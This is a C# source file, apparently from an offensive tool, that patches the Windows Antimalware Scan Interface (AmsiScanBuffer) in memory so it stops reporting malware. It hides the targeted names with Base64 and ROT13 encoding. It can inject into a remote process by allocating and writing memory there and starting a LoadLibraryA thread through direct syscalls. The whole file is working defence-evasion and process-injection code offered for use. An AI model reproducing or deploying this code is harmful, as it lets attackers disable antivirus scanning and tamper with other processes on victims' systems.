//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class AM51
    {
        static readonly byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        public static void Patch(IntPtr processHandle = default(IntPtr), int processID = 0, bool force = false)
        {
            ChangeBytes(x64, processHandle, processID, force);
        }

        static void ChangeBytes(byte[] patch, IntPtr processHandle, int processID, bool force)
        {
            try
            {
                #region GetLibraryAddress
                var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));
                var funcNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                var funcName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", funcNameB64)));

                var funcAddress = IntPtr.Zero;
                try
                {
                    funcAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: force);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"(AM51|force:{force}) [!] {e.Message}, skipping");
                    return;
                }

                IntPtr regionSize = IntPtr.Zero;
                NTSTATUS ntstatus = 0;

                if (processHandle != IntPtr.Zero)
                {
                    var libAddress = DI.DynamicInvoke.Generic.GetLoadedModuleAddress(libName);
                    var offset = (long)funcAddress - (long)libAddress;

                    if (force)
                    {
                        var loadLibraryAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(new string("xreary32.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("YbnqYvoenelN".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                        #region NtAllocateVirtualMemory (bLibName, PAGE_READWRITE)

                        IntPtr remoteLibAddress = IntPtr.Zero;
                        var bLibName = Encoding.ASCII.GetBytes(libName);
                        regionSize = new IntPtr(bLibName.Length + 2);

                        ntstatus = Syscalls.NtAllocateVirtualMemory(
                            processHandle,
                            ref remoteLibAddress,
                            IntPtr.Zero,
                            ref regionSize,
                            DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                            DI.Data.Win32.WinNT.PAGE_READWRITE);

                        if (ntstatus == NTSTATUS.Success)
                            Console.WriteLine($"(AM51|force:{force}) [+] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE");
                        else
                            throw new Exception($"(AM51|force:{force}) [-] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE: {ntstatus}");

                        #endregion

                        #region NtWriteVirtualMemory (bLibName)

                        var buffer = Marshal.AllocHGlobal(bLibName.Length);
                        Marshal.Copy(bLibName, 0, buffer, bLibName.Length);

                        uint bytesWritten = 0;

                        ntstatus = Syscalls.NtWriteVirtualMemory(
                            processHandle,
                            remoteLibAddress,
                            buffer,
                            (uint)bLibName.Length,
                            ref bytesWritten);

                        if (ntstatus == NTSTATUS.Success)
                            Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, bLibName");
                        else
                            throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, bLibName: {ntstatus}");

                        Marshal.FreeHGlobal(buffer);

                        #endregion

                        #region NtCreateThreadEx (LoadLibraryA)

                        IntPtr hThread = IntPtr.Zero;

                        ntstatus = Syscalls.NtCreateThreadEx(
                            ref hThread,
                            DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                            IntPtr.Zero,
                            processHandle,
                            loadLibraryAddress,
                            remoteLibAddress,
                            false,
                            0,
                            0,
                            0,
                            IntPtr.Zero);

                        if (ntstatus == NTSTATUS.Success)
                            Console.WriteLine($"(AM51|force:{force}) [+] NtCreateThreadEx, LoadLibraryA");
                        else
                            throw new Exception($"(AM51|force:{force}) [-] NtCreateThreadEx, LoadLibraryA: {ntstatus}");

                        System.Threading.Thread.Sleep(2000);

                        #endregion
                    }

                    var dllNotFound = true;
                    using var process = Process.GetProcessById(processID);

                    foreach (ProcessModule module in process.Modules)
                    {
                        if (!module.ModuleName.Equals(libName, StringComparison.OrdinalIgnoreCase)) continue;

                        funcAddress = new IntPtr((long)module.BaseAddress + offset);
                        dllNotFound = false;
                        break;
                    }

                    if (dllNotFound)
                    {
                        Console.WriteLine($"(AM51|force:{force}) [!] DLL not found in remote process, skipping");
                        return;
                    }
                }

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr protectAddress = funcAddress;
                regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                else
                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                #endregion

                if (processHandle != IntPtr.Zero)
                {
                    #region NtWriteVirtualMemory (patch)

                    var buffer = Marshal.AllocHGlobal(patch.Length);
                    Marshal.Copy(patch, 0, buffer, patch.Length);

                    uint bytesWritten = 0;

                    Console.WriteLine($"(AM51|force:{force}) [>] Patching in remote process at address: " + string.Format("{0:X}", funcAddress.ToInt64()));
                    ntstatus = Syscalls.NtWriteVirtualMemory(
                        processHandle,
                        funcAddress,
                        buffer,
                        (uint)patch.Length,
                        ref bytesWritten);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, patch");
                    else
                        throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, patch: {ntstatus}");

                    Marshal.FreeHGlobal(buffer);

                    #endregion
                }
                else
                {
                    Console.WriteLine($"(AM51|force:{force}) [>] Patching in current process at address: " + string.Format("{0:X}", funcAddress.ToInt64()));
                    Marshal.Copy(patch, 0, funcAddress, patch.Length);
                }

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;
                uint tmpProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref funcAddress,
                    ref regionSize,
                    oldProtect,
                    ref tmpProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, oldProtect");
                else
                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51|force:{force}) [x] {e.Message}");
                Console.WriteLine($"(AM51|force:{force}) [x] {e.InnerException}");
            }
        }
    }
}
